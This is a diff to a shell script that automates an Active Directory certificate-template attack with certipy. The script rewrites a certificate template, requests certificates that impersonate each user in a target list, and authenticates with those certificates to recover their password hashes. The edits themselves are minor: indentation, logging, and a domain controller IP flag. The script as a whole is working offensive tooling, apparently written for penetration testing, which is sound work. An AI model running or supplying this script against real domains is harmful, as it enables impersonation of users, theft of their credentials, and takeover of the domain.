@@ -48,28 +48,27 @@ fi
 [ "${1:-}" = "--" ] && shift
 
 if [ ! -z "$hash" ]; then
-	cmd="-hashes "$hash
+        cmd="-hashes "$hash
 fi
 if [ ! -z "$password" ]; then
-	cmd="-p "$password
+        cmd="-p "$password
 fi
 
 execution_date=`date +%s`; output_dir='output_'$template'_'$execution_date
 mkdir $output_dir
-touch $output_dir/logs.txt
 
 if [ ! $DoNotChangeTemplateConfiguration ]; then
-  echo "> \e[0;31m Modifying the certificate template \e[0m" $template | tee -a $output_dir/logs.txt
-  certipy template -u $username'@'$domain -template $template -save-old $cmd 2>/dev/null >> $output_dir/logs.txt
+  echo "> \e[0;31m Modifying the certificate template \e[0m" $template | tee $output_dir/logs.txt
+  certipy template -u $username'@'$domain -template $template -save-old $cmd -dc-ip $dc_ip 2>/dev/null >> $output_dir/logs.txt
   mv $template'.json' $output_dir
   echo "The old certificate template is saved here: " $output_dir/$template'.json' | tee -a $output_dir/logs.txt
 fi
 echo "> \e[0;31m Reading targeted users from the file: \e[0m" $targeted_users | tee -a $output_dir/logs.txt
 for requested_user in `cat $targeted_users | cut -d '' -f 1`; do 
-	echo "Request & auth for the user: " $requested_user
-	echo "  > \e[0;31m Requesting a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
-	certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user 2>/dev/null >> $output_dir/logs.txt
-	echo "  > \e[0;31m Authenticating with a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
+        echo "Request & auth for the user: " $requested_user
+        echo "  > \e[0;31m Requesting a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
+        certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user 2>/dev/null >> $output_dir/logs.txt
+        echo "  > \e[0;31m Authenticating with a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
         certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc_ip 2>/dev/null >> $output_dir/logs.txt
 done
 if [ ! $DoNotChangeTemplateConfiguration ]; then
@@ -80,4 +79,3 @@ echo "Find the certipy output here: " $output_dir/logs.txt
 echo ""
 echo "This is your hashes: "
 grep "Got hash for" $output_dir/logs.txt 
-
